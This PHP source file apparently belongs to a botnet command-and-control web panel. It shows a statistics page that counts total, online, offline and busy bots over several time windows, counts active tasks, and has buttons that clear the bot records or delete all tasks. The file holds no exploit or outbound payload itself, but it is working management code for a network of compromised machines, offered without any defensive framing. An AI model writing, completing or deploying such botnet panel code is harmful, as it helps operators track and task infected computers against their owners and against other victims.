<?php
	class template_Statistic
	{
		private $Content = NULL;
		private $Title = 'Statistic';
		
		public function __construct()
		{
			global $FNC;
			global $DB;
			
			$rAction = $_GET['action'];
			$rTime = time();
			
			if($rAction == "clear_statistic") 
			{
				$DB->Query("DELETE FROM bots");
				$DB->Query("DELETE FROM tasks_done");
				$this->Content .= $FNC->Content("The Statistic is successfully cleared!", "success");
			}
			elseif($rAction == "clear_tasks")
			{
				$DB->Query("DELETE FROM tasks");
				$DB->Query("DELETE FROM tasks_done");
				$DB->Query("UPDATE bots SET taskID = '0'");
				$this->Content .= $FNC->Content("Tasks successfully deleted!", "success");
			}
			
			$Query = $DB->Query("SELECT (SELECT count(*) FROM bots) AS bots_all, (SELECT count(*) FROM bots WHERE Request > '" . ($rTime - BOT_TIME_ON) .
				"') AS bots_online, (SELECT count(*) FROM bots WHERE Request > '" . ($rTime - 86400) .
					"') AS bots_online24, (SELECT count(*) FROM bots WHERE Request > '" . ($rTime - 604800) .
						"') AS bots_online7, (SELECT count(*) FROM bots WHERE Request > '" . ($rTime - BOT_TIME_ON) . "' AND taskID != '0') AS bots_busy, 
							(SELECT count(*) FROM tasks AS t WHERE t.elapsed > '" . $rTime . "' OR (t.elapsed = '0' AND (SELECT count(*) FROM tasks_done WHERE taskID = t.taskID) < t.bots)) AS tasks");
			
			$sData = $DB->getRowArray($Query);
			
			$Table = '<table>';
			$Table .= '<tr><td style="text-align:right;width:40%">Total Bots:</td><td><b>' . $sData['bots_all'] . ' Bots</b></td></tr>';
			$Table .= '<tr><td style="text-align:right;">Bots Online:</td><td><b>' . $sData['bots_online'] . ' Bots</b> (' . round($sData['bots_online'] / $sData['bots_all'] * 100, 2) . '%)</td></tr>';
			$Table .= '<tr><td style="text-align:right;">Bots Offline:</td><td><b>' . ($sData['bots_all'] - $sData['bots_online']) . ' Bots</b> (' . round(($sData['bots_all'] ? ($sData['bots_all'] - $sData['bots_online']) / $sData['bots_all'] * 100 : 0), 2) . '%)</td></tr>';
			$Table .= '<tr><td style="text-align:right;">Bots Online (24 hours):</td><td><b>' . $sData['bots_online24'] . ' Bots</b> (' . round($sData['bots_online24'] / $sData['bots_all'] * 100, 2) . '%)</td></tr>';
			$Table .= '<tr><td style="text-align:right;">Bots Online (7 days):</td><td><b>' . $sData['bots_online7'] . ' Bots</b> (' . round($sData['bots_online7'] / $sData['bots_all'] * 100, 2) . '%)</td></tr>';
			$Table .= '<tr><td style="text-align:right;">Busy Bots:</td><td><b>' . $sData['bots_busy'] . ' Bots</b> (' . round($sData['bots_busy'] / $sData['bots_all'] * 100, 2) . '%)</td></tr>';
			$Table .= '<tr><td style="text-align:right;">Active Tasks:</td><td><b>' . $sData['tasks'] . ' Tasks</b></td></tr>';
			$Table .= '</table><div style="text-align:right;padding:10px"><a href="?q=statistic&action=clear_statistic"  onclick="return confirm(\'Do you really want to clear the Statistic ?\')" class="button"><span>Clear Statistic</span></a><a href="?q=statistic&action=clear_tasks"  onclick="return confirm(\'Do you really want to delete all Tasks?\')"class="button"><span>Delete Tasks</span></a></div>';
			$this->Content .= $FNC->Content($Table);
		}
		
		public function getContent()
		{
			return $this->Content;
		}
		
		public function getTitle()
		{
			return $this->Title;
		}
	}
?>